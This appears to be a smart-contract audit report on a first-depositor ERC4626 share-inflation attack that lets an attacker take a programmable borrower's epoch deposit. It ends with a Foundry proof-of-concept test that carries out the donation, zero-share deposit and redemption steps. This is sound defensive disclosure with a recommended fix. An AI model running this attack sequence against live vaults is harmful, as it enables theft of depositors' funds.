### Title
ERC4626 first-depositor donation can steal the programmable borrower’s epoch liquidity - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary

`ProgrammableBorrower` verifies only that the configured ERC4626 vault reports the correct `asset()`; it does not enforce a minimum returned share amount or a post-deposit asset value when idle credit-vault funds are deposited. A user of a susceptible configured ERC4626 vault can inflate its share price before the credit vault’s first deposit, cause the programmable borrower to receive zero shares for the full deposit, and redeem the donated-plus-pool assets through their own vault share. The missing slippage/output validation is in `ProgrammableBorrower`, not merely in the external vault. [1](#0-0) [2](#0-1) 

### Finding Description

The vulnerable path is the programmable-borrower epoch startup:

1. `IdleCDOEpochVariant.startEpoch()` transfers available pool principal to the configured borrower, which is the `ProgrammableBorrower` in this mode. [3](#0-2) 
2. `ProgrammableBorrower.onStartEpoch()` measures total assets before depositing idle cash and stores that amount as `epochStartVaultAssets`. [4](#0-3) 
3. `_depositToVault()` calls `vault.deposit(_assetAmount, address(this))`, records the returned `shares` only in an event, and never checks that the returned shares are nonzero or convertible back to approximately `_assetAmount`. [5](#0-4) 
4. `_currentVaultAssets()` later trusts the vault’s `convertToAssets()` view for the shares held by the borrower. If no shares were minted, the entire deposited amount is absent from the programmable borrower’s live position. [6](#0-5) 

For an ERC4626 vault with empty or near-empty supply and no inflation-resistant virtual-share offset, an attacker can deposit `1` unit, donate `A` underlying directly to the vault, and inflate the share price to approximately `A + 1`. When the credit vault deposits `A`, integer division mints `A / (A + 1) = 0` shares to `ProgrammableBorrower`. The attacker’s single share can then redeem the entire `2A + 1` vault balance, producing an approximate net theft of `A`.

This is the same trust-boundary shape as the reported issue: an unprivileged actor supplies externally controlled data through a path that is not subjected to the safety invariant assumed downstream. Here, `asset()` confirms only the vault’s denomination; it does not establish that the vault’s exchange-rate mechanics safely convert the accepted deposit into economically equivalent shares. [1](#0-0) [7](#0-6) 

The existing checks do not stop the sequence. `setVault()` requires only a nonzero address and matching asset, `onStartEpoch()` snapshots cash before calling `_depositToVault()`, and `_depositToVault()` accepts a zero share output. `_skimDonatedAssets()` also cannot help because the donation is sent to the external ERC4626 vault, not directly to `IdleCDOEpochVariant`. [8](#0-7) [9](#0-8) 

### Impact Explanation

An unprivileged ERC4626 vault participant or direct underlying sender can steal substantially all assets from the first programmable-borrower vault deposit. For a deposit of `A`, the attacker contributes approximately `A + 1` underlying and redeems approximately `2A + 1`, leaving the programmable borrower with zero vault shares.

The credit vault continues to hold minted `IdleCreditVault` strategy tokens representing the dispatched principal even though the external vault position no longer backs them. A later epoch stop cannot source pending withdrawals from the programmable borrower, causing borrower-default handling or leaving the pool insolvent until default recovery. Pending withdraw receipts and active LP principal up to the deployed amount `A` are directly impaired. [10](#0-9) [11](#0-10) [12](#0-11) 

### Likelihood Explanation

Likelihood is conditional on integrating an ERC4626 vault whose share mathematics permit first-depositor inflation or zero-share deposits. `setVault()` accepts any ERC4626-compatible address with the same asset and does not require a minimum vault supply, seed position, bounded deposit output, or known inflation-resistant implementation. An attacker needs only normal external-vault deposit and redeem permissions plus enough underlying to inflate the exchange rate above the credit vault’s first deposit amount. [13](#0-12) 

Hardened ERC4626 implementations that use virtual shares/assets or revert on zero-share deposits prevent the concrete theft path, but the production code does not encode that requirement. The issue is therefore exploitable whenever an honest manager configures a standards-compatible but inflation-susceptible vault, and it is most severe for a newly created or empty external vault before its first meaningful deposit.

### Recommendation

Add deposit-output validation in `ProgrammableBorrower._depositToVault()`:

- Call `previewDeposit(_assetAmount)` and require a nonzero expected share amount.
- Require `vault.deposit()` to return at least an operator-configured `minSharesOut`.
- After deposit, require `vault.convertToAssets(returnedShares)` to be within an explicit rounding tolerance of `_assetAmount`.
- Reject vaults whose `totalSupply()` or `totalAssets()` is below a configured minimum at `initialize()` and `setVault()`.
- Prefer allowlisting reviewed inflation-resistant ERC4626 implementations rather than relying only on `asset()`.

The conversion check should use actual received shares and post-deposit valuation, not merely the ERC4626 `asset()` declaration. The same validation should be applied in `initialize()`, `setVault()`, `onStartEpoch()`, and `_repay()`’s redeployment path.

### Proof of Concept

The following Foundry reproduction demonstrates the broken invariant on a mainnet fork using a minimal standards-compatible ERC4626 vault without virtual-share inflation protection. It isolates the `ProgrammableBorrower` deposit boundary; wiring it into the existing programmable-borrower credit-vault fixture produces the same result through `startEpoch()`.

```solidity
// test/foundry/ProgrammableBorrowerVaultInflation.t.sol
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20Detailed} from "../../contracts/interfaces/IERC20Detailed.sol";
import {ProgrammableBorrower} from "../../contracts/strategies/idle/ProgrammableBorrower.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

contract InflationVault is ERC20 {
    IERC20Detailed public immutable assetToken;

    constructor(address asset_) ERC20("Inflation Share", "INF") {
        assetToken = IERC20Detailed(asset_);
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function totalAssets() public view returns (uint256) {
        return assetToken.balanceOf(address(this));
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? shares : shares * totalAssets() / supply;
    }

    function convertToShares(uint256 assets) public view returns (uint256) {
        uint256 supply = totalSupply();
        uint256 assetsHeld = totalAssets();
        return supply == 0 || assetsHeld == 0 ? assets : assets * supply / assetsHeld;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = convertToShares(assets);
        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares); // zero-share deposits are not rejected
    }

    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
        assets = convertToAssets(shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }

    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares) {
        uint256 supply = totalSupply();
        shares = supply == 0 ? assets : (assets * supply + totalAssets() - 1) / totalAssets();
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }

    function maxWithdraw(address owner) external view returns (uint256) {
        return convertToAssets(balanceOf(owner));
    }
}

contract MockCDO {
    address public token;
    constructor(address token_) { token = token_; }
}

contract ProgrammableBorrowerVaultInflation is Test {
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    IERC20Detailed usdc = IERC20Detailed(USDC);
    InflationVault vault;
    ProgrammableBorrower borrower;
    MockCDO cdo;

    address attacker = makeAddr("attacker");
    address owner = makeAddr("owner");
    address manager = makeAddr("manager");
    address realBorrower = makeAddr("realBorrower");

    function testFirstDepositInflationStealsEpochCash() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        cdo = new MockCDO(USDC);
        vault = new InflationVault(USDC);

        ProgrammableBorrower impl = new ProgrammableBorrower();
        borrower = ProgrammableBorrower(address(new TransparentUpgradeableProxy(
            address(impl),
            address(this),
            abi.encodeWithSelector(
                ProgrammableBorrower.initialize.selector,
                address(vault),
                address(cdo),
                owner,
                manager,
                realBorrower,
                0
            )
        )));

        uint256 poolDeposit = 10_000e6;
        deal(USDC, attacker, poolDeposit + 1);
        deal(USDC, address(borrower), poolDeposit);

        // Attacker creates the first share and inflates its price above poolDeposit.
        vm.startPrank(attacker);
        usdc.approve(address(vault), 1);
        vault.deposit(1, attacker);
        usdc.transfer(address(vault), poolDeposit);
        vm.stopPrank();

        // Production startEpoch path: all idle cash is deposited without a min-share check.
        vm.prank(address(cdo));
        borrower.onStartEpoch(0);

        assertEq(vault.balanceOf(address(borrower)), 0);
        assertEq(vault.balanceOf(attacker), 1);
        assertEq(usdc.balanceOf(address(vault)), 2 * poolDeposit + 1);

        uint256 attackerBefore = usdc.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);

        assertEq(usdc.balanceOf(attacker) - attackerBefore, 2 * poolDeposit + 1);
        assertEq(vault.balanceOf(address(borrower)), 0);
        assertEq(borrower.totalUnderlying(), 0);
    }
}
```
